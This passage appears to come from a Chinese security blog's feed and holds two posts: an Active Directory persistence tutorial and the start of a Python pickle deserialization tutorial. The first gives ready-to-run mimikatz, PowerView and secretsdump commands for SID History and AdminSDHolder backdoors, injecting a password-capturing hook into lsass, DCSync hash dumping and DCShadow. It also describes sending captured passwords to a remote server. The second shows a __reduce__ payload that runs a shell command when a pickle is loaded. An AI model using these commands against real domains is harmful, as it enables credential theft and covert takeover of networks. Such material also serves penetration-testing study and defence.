Identifiers)是指安全标识符，是用户、用户组或其他安全主体的唯一、不可变标识符。</p><p>Windows 根据 ACL(访问控制列表)授予或拒绝对资源的访问和特权，ACL 使用SID 来唯一标识用户及其组成员身份。当用户登录到计算机时，会生成一个访问令牌其中包含用户和组 SID和用户权限级别。当用户请求访问资源时，将根据 ACL 检查访问令牌以允许或拒绝对特定对象的特定操作。</p><p>SID History 是一个支持域迁移方案的属性，使得一个账户的访问权限可以有效地克隆到另一个账户，这在域迁移过程中非常有用。例如，当Domain A 中的用户迁移到Domain B 时，会在 Domain B中创建一个新的用户账户，并将Domain A用户的 SID 添加到 DomainB 的用户账户的 SID History属性中。这就确保了 DomainB用户仍然拥有访问 DomainA 中资源的权限。</p><p><strong>利用方法</strong></p><p>测试人员可以将域管理员用户的SID添加到其他域用户的SID History属性中，以此建立一个隐蔽的域后门，该方法需要拥有域管理员级别的权限。</p><p>以创建用户Hacker为例：</p><ol><li><p>上传mimikatz执行以下命令将域管理员的SID添加到Hacker用户的SID History属性中</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Mimikatz &gt; 2.1.0</span><br>mimikatz.exe &quot;privilege::debug&quot; &quot;sid::patch&quot; &quot;sid::add /sam::Hacker /new:Administrator&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Mimikatz &lt; 2.1.0</span><br>mimikatz.exe &quot;privilege::debug&quot; &quot;misc:addsid Hacker ADSAdministrator&quot; exit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710524.png" alt="image-20240418231321732"></p></li><li><p>PowerShell查看Hacker用户的属性：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Import-Module ActiveDirectory<br>Get-ADUser Hacker -Properties SIDHistory<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710525.png" alt="image-20240418231512445"></p><p>可以发现Hacker用户已经继承了权限</p></li><li><p>然后就可以通过Hacker用户成功连接到域控制器，执行<strong>whoami &#x2F;priv</strong>可以看到拥有域管理员的所有特权</p></li></ol><h2><span id="利用adminsdholder打造域后门">利用AdminSDHolder打造域后门</span></h2><p><strong>AdminSDHolder</strong></p><p>AdminSDHolder 是一个特殊的 Active Directory 容器对象,位于 Domain CN 的 System容器下。AdminSDHolder 通常作为系统中某些受保护对象的安全模板，以防止这些对象遭受恶意修改或滥用。</p><p><img src="http://cdn.clown2024.cn/202407151710526.png" alt="image-20240418231838646"></p><p>受保护对象通常包括系统的特权用户和重要的组,如 Administrator、Domain Admins、Enterprise Admins 以及Schema Admins 等。</p><p>在活动目录中，属性 adminCount用来标记特权用户和组。对于特权用户和组来说，该属性值被设为 1。通过 AdFind 查询 adminCount 属性设置为1的对象，可以找到所有受 AdminSDHolder 保护的特权用户和组</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">枚举受保护的用户</span><br>Adfind.exe -b &quot;dc=hacke,dc=testlab&quot; -f &quot;&amp;(objectcategory=person)(amaccountname=*)(admincount=1)&quot; -dn<br><span class="hljs-meta prompt_"># </span><span class="language-bash">枚举受保护的组</span><br>Adfind.exe -b &quot;dc=hacke,dc=testlab&quot; -f &quot;&amp;(objectcategory=group)(admincount=1)&quot; -dn<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710527.png" alt="image-20240419000448192"></p><p>在默认情况下，系统将定期(每 60分钟)检查受保护对象的安全描述符，将受保护对象的 ACL 与 AdminSDHolder 容器的 ACL 进行比较，如果二者不一致，系统就会将受保护对象的 ACL 强制修改为 AdminSDHolder 容器的 ACL。该工作通过 SDProp 进程来完成，该进程以 60分钟为一个工作周期。</p><p><strong>利用方法</strong></p><p>在实战中,测试人员可以篡改 AdminSDHolder 容器的 ACL 配置。当系统调用 SDProp进程执行相关工作时，被篡改的 ACL 配置将同步到受保护对象的 ACL 中，以此建立一个隐蔽的域后门。利用该技术需要拥有域管理员级别的权限</p><p>执行以下命令，通过 PowerView 向 AdminSDHolder 容器对象添加一个 ACL，使普通域用户 Marcus 拥有对 AdminSDHolder 的“完全控制”权限，项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Import-Module .\PowerView.ps1<br>Add-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,Dc=hack-my<br>DC=com&quot; -PrincipalIdentity Marcus -Rights All -Verbose<br></code></pre></td></tr></table></figure><p>执行后,Marcus用户成功拥有AdminSDHolder容器对象的完全控制权限。</p><p><img src="http://cdn.clown2024.cn/202407151710528.png" alt="image-20240419001254688"></p><p>等待 60分钟后，Marcus 用户将获得对系统中的特权用户和组完全控制权限。</p><p><img src="http://cdn.clown2024.cn/202407151710529.png" alt="image-20240419001334730"></p><p>要清除对AdminSDHolder的完全控制权限，执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Remove-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=hack-my<br>DC=com&quot; -PrincipalIdentity Marcus Rights All -Verbose<br></code></pre></td></tr></table></figure><h2><span id="hook-passwordchangenotify">HOOk PasswordChangeNotify</span></h2><p>PasswordChangeNotify 在微软官方文档中的名称为PsamPasswordNotificationRoutine,是一个 WindowS API。当用户重置密码时，Windows会先检查新密码是否符合复杂性要求，如果密码符合要求，LSA 会调用PasswordChangeNotify函数在系统中同步密码。该函数的语法大致如下：</p><p><img src="http://cdn.clown2024.cn/202407151710530.png" alt="image-20240419002150589"></p><p>当调用 PasswordChangeNotify 时，用户名和密码将以明文的形式传入。测试人员可以通过 HOOK 技术，劫持PasswordChangeNotify 函数的执行流程，从而获取传入的明文密码。</p><p>其流程大致如下，需要的工具有：HookPasswordChange.dll(项目地址：<a href="https://github.com/clymb3r/Misc-Windows-Hacking)%E5%92%8CInvoke-ReflectivePEInjection.ps1(%E4%BD%8D%E4%BA%8EPowerSploit%E9%A1%B9%E7%9B%AE%E7%9A%84CodeExecution%E7%9B%AE%E5%BD%95%E4%B8%8B)">https://github.com/clymb3r/Misc-Windows-Hacking)和Invoke-ReflectivePEInjection.ps1(位于PowerSploit项目的CodeExecution目录下)</a></p><ol><li><p>将HookPasswordChange.dll和Invoke-ReflectivePEInjection.ps1上传到域控，并将HookPasswordChange.dl注入到lsass.exe进程</p><figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 导入Invoke-ReflectivePEInjection.ps1</span><br><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-ReflectivePEInjection</span>.ps1<br><span class="hljs-comment"># 读取HookPasswordChange.dll并将其注入到lsass进程</span><br><span class="hljs-variable">$PEBytes</span> = [<span class="hljs-type">IO.File</span>]::ReadAllBytes(<span class="hljs-string">&#x27;C:\Users\Administrator\HookPasswordChange.dll&#x27;</span>)<br><span class="hljs-built_in">Invoke-ReflectivePEInjection</span> <span class="hljs-literal">-PEBytes</span> <span class="hljs-variable">$PEBytes</span> <span class="hljs-literal">-ProcName</span> lsass<br></code></pre></td></tr></table></figure></li><li><p>当网络管理员修改用户密码时，用户的新密码将记录在C:\Windows\Temp 目录的passwords.txt 文件中</p><p>password.txt保存的目录还可以自定义，需要在HookPasswordChange.cpp文件中修改</p></li></ol><p>为了将获取的用户密码传回远程服务器，在源码的基础上可以通过WinNet API添加HTTP请求功能，代码大致如下：</p><p><img src="http://cdn.clown2024.cn/202407151710531.png" alt="image-20240419004013067"></p><p>原本github上面有项目但是不见了，到时候有机会再自己改（</p><p>修改后重新编译生成HookPasswordChange.dll，当管理员修改密码时就可以通过post方法将密码带到远程服务器</p><p><img src="http://cdn.clown2024.cn/202407151710532.png" alt="image-20240419004224553"></p><h1><span id="dcsync攻击技术">DCSync攻击技术</span></h1><p>一个域环境可以拥有多台域控制器，每台域控制器各自存储着一份所在域的活动目录的可写副本，对目录的任何修改都可以从源域控制器同步到本域、域树或域林中的其他域控制器上。当一个域控想从另一个域控获取域数据更新时，客户端域控会向服务端域控发送 DSGetNCChanges 请求，该请求的响应将包含客户端域控必须应用到其活动目录副本的一组更新。通常情况下，域控制器之间每 15 分钟就会有一次域数据同步。</p><p>DCSync 技术就是利用域控制器同步的原理,通过Directory Replication Service(DRS服务的 IDL_DRSGetNCChanges 接口向域控发起数据同步请求。在 DCSync 出现前，要获得所有域用户的哈希，测试人员可能需要登录域控制器或通过卷影拷贝技术获取NTDS.dit 文件。利用 DCSync，测试人员可以在域内任何一台机器上模拟一个域控制器通过域数据同步复制的方式获取正在运行的合法域控制器上的数据。注意，DCSync攻击不适用于只读域控制器(RODC)</p><p>在默认情况下，只有Administrators、Domain Controllers 和Enterprise Domain Admins组内的用户和域控制器的机器账户才有执行DCSync操作的权限。</p><h2><span id="利用dcsync导出域内哈希">利用DCSync导出域内哈希</span></h2><p><strong>Mimikatz下的利用</strong></p><p>执行下面命令导出域内用户信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">导出域内指定用户的信息，包括哈希值</span><br>mimkatz.exe &quot;lsadump::dcsync /domain:hack-my.com /user:hacky-my\administrator&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">导出域内所有用户的信息，包括哈希值</span><br>mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all&quot; exit<br>mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all /csv&quot; exit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151710533.png" alt="image-20240419005028742"></p><p>一般来说，域管理员权限的用户以及 Krbtgt 用户的哈希是有价值的。通过域管理员的哈希进行哈希传递可以直接获取服务器控制权，而Krbtgt用户的哈希可以用来制作黄金票据，实现票据传递攻击。</p><p><strong>Impacket下的利用</strong></p><p>Impacket项目中的secretsdump.py脚本支持通过 DCSync 技术导出域控制器中用户哈希。该工具可以使用提供的高权限用户的登录凭据，从未加入域的系统上远程连接至域控制器，并从注册表中导出本地账户的哈希值，同时通过 Dcsync 或卷影复制的方法NTDS.dit 文件中导出所有域用户的哈希值。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python secretsdump.py hack-my.com/administrator:Admin\@123@10.10.10.11 -just-dc-user &quot;hack-my\administrator&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">10.10.10.11为域控的IP</span><br></code></pre></td></tr></table></figure><h2><span id="利用dcsync维持域内权限">利用DCSync维持域内权限</span></h2><p>在获取域管理员权限后，测试人员可以手动为域内标准用户赋予 DCSync 操作的权限，从而实现隐蔽的域后门。只需为普通域用户添加表所示的两条扩展权限即可。</p><table><thead><tr><th>CN</th><th>displayName</th><th>rightsGuid</th></tr></thead><tbody><tr><td>DS-Replication-Get-Changes</td><td>Replicating Directory Changes</td><td>1131f6aa-9c07-11d1-f79f-00c04fc2ded2</td></tr><tr><td>DS-Replication-Get-Changes</td><td>Replicating Directory Changes All</td><td>1131f6ad-9c07-11d1-f79f-00c04fc2ded2</td></tr></tbody></table><p>可以通过PowerShell渗透框架下的PowerView.ps1脚本实现。执行以下命令：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\PowerView.ps1<br><span class="hljs-comment"># 为域用户Marcus添加DCSync权限</span><br><span class="hljs-built_in">Add-DomainObjectAcl</span> <span class="hljs-literal">-TargetIdentity</span> <span class="hljs-string">&quot;DC=hack-my,DC=com&quot;</span> <span class="hljs-literal">-PrincipalIdentity</span> Marcus<br><span class="hljs-literal">-Rights</span> DCSync <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure><p>如果要清除权限则执行下面命令：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Remove-DomainObjectAcl</span> <span class="hljs-literal">-TargetIdentity</span> <span class="hljs-string">&quot;DC=hack-my,DC=com&quot;</span> <span class="hljs-literal">-PrincipalIdentity</span> Marcus<br><span class="hljs-literal">-Rights</span> DCSync <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure><h2><span id="dcshadow">DCShadow</span></h2><p>DCShadow 通过创建恶意的域控制器，利用域控之间的数据同步复制，将预先设定的对象或对象属性注入正在运行的合法域控制器，以此来创建域后门或者获取各种类型的非法访问渠道。</p><p>相关原理参考文章：<a href="https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/">https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/</a></p><p>下面通过 DCShadow修改普通域用户Marcus的primaryGroupID属性演示 DCShadow的攻击过程。该属性指向用户所属的主要组的RID，通过将用户的 primaryGroupID 改为 512，可以让用户成为域管理员。RID 指相对标识符，是 SID 的组成部分，位于 SID 字符串的末端。Windows系统使用RID来区分用户账户和组，常见系统账户的 RID 如表：</p><table><thead><tr><th>组</th><th>RID</th></tr></thead><tbody><tr><td>Administrator</td><td>500</td></tr><tr><td>Guest</td><td>501</td></tr><tr><td>Kribtgt</td><td>502</td></tr><tr><td>Domain Admins</td><td>512</td></tr><tr><td>Domain Users</td><td>513</td></tr><tr><td>Domain Guests</td><td>514</td></tr><tr><td>Domain Computers</td><td>515</td></tr><tr><td>Domain Controllers</td><td>516</td></tr><tr><td>Schema Admins</td><td>518</td></tr><tr><td>Enterprise Admins</td><td>519</td></tr></tbody></table><p>攻击流程如下：</p><ol><li><p>上传Mimikatz到主机，在拥有SYSTEM权限下执行下面命令来创建恶意域控</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;lsadump::dcshadow /object:CN=Marcus,CN=Users,DC=hack-my,DC=com /attribute:primaryGroupID /value:512&quot; exit<br></code></pre></td></tr></table></figure></li><li><p>执行后第一个命令行窗口不关闭，新开一个域管理员权限的命令行窗口，然后执行下面命令强制触发域复制，将数据更改推送至合法域控</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;lsadump::dcshadow /push&quot; exit<br></code></pre></td></tr></table></figure></li></ol><p>此时，Marcus用户的primaryGroupID属性已成功被修改为512，并且Marcus 已经是域管理员组中的用户了。</p><p>可以用该命令来查看域管理员组用户来验证：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group  &quot;Domain Admins&quot; /domain<br></code></pre></td></tr></table></figure><p>DCShadow 使得测试人员可以直接修改活动目录数据库中的对象。在域防护比较严格的情况下，可以通过 DCShadow操纵 SID History、Krbtgt 账户的密码，或将用户添加到特权组，以实现域权限持久化。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pickle反序列化</title>
      <link href="/2024/04/12/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/04/12/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>主要是记录一下opcode方便查</p><p>参考文章：<a href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0G0=it0Q6qGNnmjiDkDB0DRll7jiYD&alichlgref=https://cn.bing.com/">pickle反序列化初探 - 先知社区 (aliyun.com)</a></p><p>这篇文章已经说的很详细了值得细品</p><h1><span id="pickle介绍">pickle介绍</span></h1><p>pickle就是python下一个用于进行序列化和反序列化的包，传输和存储数据更加灵活，是给python专用的。</p><ul><li>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。</li><li>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</li></ul><h1><span id="可序列化对象">可序列化对象</span></h1><ul><li><code>None</code> 、 <code>True</code> 和 <code>False</code></li><li>整数、浮点数、复数</li><li>str、byte、bytearray</li><li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li><li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</li><li>定义在模块最外层的内置函数</li><li>定义在模块最外层的类</li><li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</li></ul><h2><span id="object__reduce__-函数"><code>object.__reduce__()</code> 函数</span></h2><ul><li>在开发时，可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 <code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</li><li>在下文pickle的opcode中， <code>R</code> 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 <code>R</code> 正好对应 <code>object.__reduce__()</code> 函数， <code>object.__reduce__()</code> 的返回值会作为 <code>R</code> 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 <code>R</code> 的。</li></ul><p>这里是一个简单的__reduce__()函数实例</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>,))<br>a = A()<br><span class="hljs-built_in">print</span>(pickle.dumps(a))<br>pickle.loads(pickle.dumps(a))<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="http://cdn.clown2024.cn/202407151442778.png" alt="image-20240426222330298"></p><h1><span id="opcode">opcode</span></h1><p>opcode就是pickle的重点了，opcode能很大的增加我们执行命令的灵活性</p><ul><li>pickle解析依靠Pickle Virtual Machine (PVM)进行。</li><li>PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存：</li><li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 停止。最终留在栈顶的值将被作为反序列化对象返回。</li><li>栈：由Python的list实现，被用来临时存储数据、参数以及对象。</li><li>memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 <code>key-value</code> 的形式储存在memo中，以便后来使用。</li></ul><h2><span id="opcode版本">opcode版本</span></h2><p>pickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本。</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br>a=&#123;<span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;2&#x27;</span>:<span class="hljs-number">2</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;pickle版本<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>,pickle.dumps(a,protocol=i))<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">输出：<br>pickle版本0 b&#x27;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#x27;<br>pickle版本1 b&#x27;&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;<br>pickle版本2 b&#x27;\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;<br>pickle版本3 b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;<br>pickle版本4 b&#x27;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.&#x27;<br></code></pre></td></tr></table></figure><p>pickle3版本的opcode示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># &#x27;abcd&#x27;<br>b&#x27;\x80\x03X\x04\x00\x00\x00abcdq\x00.&#x27;<br><br># \x80：协议头声明 \x03：协议版本<br># \x04\x00\x00\x00：数据长度：4<br># abcd：数据<br># q：储存栈顶的字符串长度：一个字节（即\x00）<br># \x00：栈顶位置<br># .：数据截止<br></code></pre></td></tr></table></figure><h2><span id="pickletools">pickletools</span></h2><p>使用pickletools可以方便的将opcode转化为便于肉眼读取的形式</p><p>同样用上面的个版本opcode版本示例</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br>a=&#123;<span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;2&#x27;</span>:<span class="hljs-number">2</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;pickle版本<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>,pickletools.dis(pickle.dumps(a,protocol=i)))<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#结果：<br>    0: (    MARK<br>    1: d        DICT       (MARK at 0)<br>    2: p    PUT        0<br>    5: V    UNICODE    &#x27;1&#x27;<br>    8: p    PUT        1<br>   11: I    INT        1<br>   14: s    SETITEM<br>   15: V    UNICODE    &#x27;2&#x27;<br>   18: p    PUT        2<br>   21: I    INT        2<br>   24: s    SETITEM<br>   25: .    STOP<br>highest protocol among opcodes = 0<br>pickle版本0 None<br>    0: &#125;    EMPTY_DICT<br>    1: q    BINPUT     0<br>    3: (    MARK<br>    4: X        BINUNICODE &#x27;1&#x27;<br>   10: q        BINPUT     1<br>   12: K        BININT1    1<br>   14: X        BINUNICODE &#x27;2&#x27;<br>   20: q        BINPUT     2<br>   22: K        BININT1    2<br>   24: u        SETITEMS   (MARK at 3)<br>   25: .    STOP<br>highest protocol among opcodes = 1<br>pickle版本1 None<br>    0: \x80 PROTO      2<br>    2: &#125;    EMPTY_DICT<br>    3: q    BINPUT     0<br>    5: (    MARK<br>    6: X        BINUNICODE &#x27;1&#x27;<br>   12: q        BINPUT     1<br>   14: K        BININT1    1<br>   16: X        BINUNICODE &#x27;2&#x27;<br>   22: q        BINPUT     2<br>   24: K        BININT1    2<br>   26: u        SETITEMS   (MARK at 5)<br>   27: .    STOP<br>highest protocol among opcodes = 2<br>pickle版本2 None<br>    0: \x80 PROTO      3<br>    2: &#125;    EMPTY_DICT<br>    3: q    BINPUT     0<br>    5: (    MARK<br>    6: X        BINUNICODE &#x27;1&#x27;<br>   12: q        BINPUT     1<br>   14: K        BININT1    1<br>   16: X        BINUNICODE &#x27;2&#x27;<br>   22: q        BINPUT     2<br>   24: K        BININT1    2<br>   26: u        SETITEMS   (MARK at 5)<br>   27: .    STOP<br>highest protocol among opcodes = 2<br>pickle版本3 None<br>    0: \x80 PROTO      4<br>    2: \x95 FRAME      17<br>   11: &#125;    EMPTY_DICT<br>   12: \x94 MEMOIZE    (as 0)<br>   13: (    MARK<br>   14: \x8c     SHORT_BINUNICODE &#x27;1&#x27;<br>   17: \x94     MEMOIZE    (as 1)<br>   18: K        BININT1    1<br>   20: \x8c     SHORT_BINUNICODE &#x27;2&#x27;<br>   23: \x94     MEMOIZE    (as 2)<br>   24: K        BININT1    2<br>   26: u        SETITEMS   (MARK at 13)<br>   27: .    STOP<br>highest protocol among opcodes = 4<br>pickle版本4 None<br></code></pre></td></tr></table></figure><p>那些符号就是opcode</p><h2><span id="手写opcode">手写opcode</span></h2><p>上面的文章有动图可以更好地理解opcode，这里主要记录一些opcode，下表是佬的opcode表格，记录了各种opcode的用法</p><table><thead><tr><th>opcode</th><th>描述</th><th>具体写法</th><th>栈上的变化</th><th>memo上的变化</th></tr></thead><tbody><tr><td>c</td><td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td><td>c[module]\n[instance]\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>o</td><td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td>o</td><td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>i</td><td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td>i[module]\n[callable]\n</td><td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>N</td><td>实例化一个None</td><td>N</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>S</td><td>实例化一个字符串对象</td><td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>V</td><td>实例化一个UNICODE字符串对象</td><td>Vxxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>I</td><td>实例化一个int对象</td><td>Ixxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>F</td><td>实例化一个float对象</td><td>Fx.x\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>R</td><td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td>R</td><td>函数和参数出栈，函数的返回值入栈</td><td>无</td></tr><tr><td>.</td><td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td>.</td><td>无</td><td>无</td></tr><tr><td>(</td><td>向栈中压入一个MARK标记</td><td>(</td><td>MARK标记入栈</td><td>无</td></tr><tr><td>t</td><td>寻找栈中的上一个MARK，并组合之间的数据为元组</td><td>t</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>)</td><td>向栈中直接压入一个空元组</td><td>)</td><td>空元组入栈</td><td>无</td></tr><tr><td>l</td><td>寻找栈中的上一个MARK，并组合之间的数据为列表</td><td>l</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>]</td><td>向栈中直接压入一个空列表</td><td>]</td><td>空列表入栈</td><td>无</td></tr><tr><td>d</td><td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td>d</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>}</td><td>向栈中直接压入一个空字典</td><td>}</td><td>空字典入栈</td><td>无</td></tr><tr><td>p</td><td>将栈顶对象储存至memo_n</td><td>pn\n</td><td>无</td><td>对象被储存</td></tr><tr><td>g</td><td>将memo_n的对象压栈</td><td>gn\n</td><td>对象被压栈</td><td>无</td></tr><tr><td>0</td><td>丢弃栈顶对象</td><td>0</td><td>栈顶对象被丢弃</td><td>无</td></tr><tr><td>b</td><td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td>b</td><td>栈上第一个元素出栈</td><td>无</td></tr><tr><td>s</td><td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td>s</td><td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td><td>无</td></tr><tr><td>u</td><td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td>u</td><td>MARK标记以及被组合的数据出栈，字典被更新</td><td>无</td></tr><tr><td>a</td><td>将栈的第一个元素append到第二个元素(列表)中</td><td>a</td><td>栈顶元素出栈，第二个元素（列表）被更新</td><td>无</td></tr><tr><td>e</td><td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td>e</td><td>MARK标记以及被组合的数据出栈，列表被更新</td><td>无</td></tr></tbody></table><p><strong>全局变量覆盖</strong></p><p>有时候我们想要修改一些全局变量的值就可以编写opcode，如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>:<br>    name=<span class="hljs-string">&quot;flag&#123;fake&#125;&quot;</span><br>secret=test()<br>opcode=<span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;flag&#123;true&#125;&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before:&#x27;</span>+secret.name)<br>output=pickle.loads(opcode.encode())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;output:&#x27;</span>,output)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>+secret.name)<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight 